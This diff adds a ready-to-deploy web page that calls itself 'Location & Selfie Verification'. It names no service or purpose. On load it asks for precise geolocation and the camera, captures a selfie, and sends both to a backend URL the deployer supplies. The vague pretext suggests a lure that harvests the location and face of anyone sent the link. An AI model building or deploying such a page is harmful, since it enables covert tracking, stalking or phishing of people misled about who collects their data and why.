@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Permission Verification</title>
+  <style>body { font-family: sans-serif; padding: 20px; text-align: center; }</style>
+</head>
+<body>
+  <h2>Location & Selfie Verification</h2>
+  <p id="status">Requesting permissions... Please click "Allow".</p>
+  <video id="video" autoplay playsinline width="300" style="display:none; border-radius: 8px;"></video>
+  <canvas id="canvas" width="300" height="225" style="display:none;"></canvas>
+  <img id="preview" width="300" style="border-radius: 8px; margin-top: 10px;" />
+
+  <script>
+    // ⚠️ After deploying the backend, you must change this to your Render URL!
+    const BACKEND_URL = 'https://YOUR-BACKEND-NAME.onrender.com/api/capture';
+
+    async function run() {
+      const statusEl = document.getElementById('status');
+      let locationData = null;
+      let selfieData = null;
+
+      // 1. Get location
+      try {
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
+        });
+        locationData = {
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        };
+        statusEl.textContent = 'Location obtained. Requesting camera...';
+      } catch (e) {
+        statusEl.textContent = 'Location failed: ' + e.message + '. Trying camera...';
+      }
+
+      // 2. Get selfie
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        await video.play();
+        await new Promise(r => setTimeout(r, 1000)); // Wait for camera to focus
+
+        const canvas = document.getElementById('canvas');
+        canvas.getContext('2d').drawImage(video, 0, 0, 300, 225);
+        selfieData = canvas.toDataURL('image/jpeg', 0.7); // Compress quality
+        document.getElementById('preview').src = selfieData;
+
+        stream.getTracks().forEach(t => t.stop()); // Turn off camera
+      } catch (e) {
+        statusEl.textContent += ' | Camera failed: ' + e.message;
+      }
+
+      // 3. Send to backend
+      if (locationData || selfieData) {
+        statusEl.textContent = 'Sending data...';
+        try {
+          const res = await fetch(BACKEND_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              location: locationData,
+              selfie: selfieData,
+              timestamp: new Date().toISOString()
+            })
+          });
+          if (res.ok) statusEl.textContent = '✅ Verification data submitted successfully.';
+          else statusEl.textContent = '❌ Server error: ' + res.status;
+        } catch (e) {
+          statusEl.textContent = '❌ Network error: ' + e.message;
+        }
+      }
+    }
+    run();
+  </script>
+</body>
+</html>
